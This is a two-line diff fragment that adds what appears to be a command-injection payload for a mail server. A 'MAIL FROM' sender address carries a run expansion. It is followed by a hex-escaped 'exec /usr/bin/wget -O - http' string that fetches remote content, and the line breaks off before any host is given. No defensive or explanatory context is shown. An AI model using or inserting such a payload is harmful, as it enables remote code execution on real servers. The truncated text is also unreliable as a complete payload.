@@ -1,0 +1,2 @@
+MAIL FROM:<$(run(
+exec\\x20\\x2Fusr\\x2Fbin\\x2Fwget\\x20\\x2DO\\x20\\x2D\\x20http
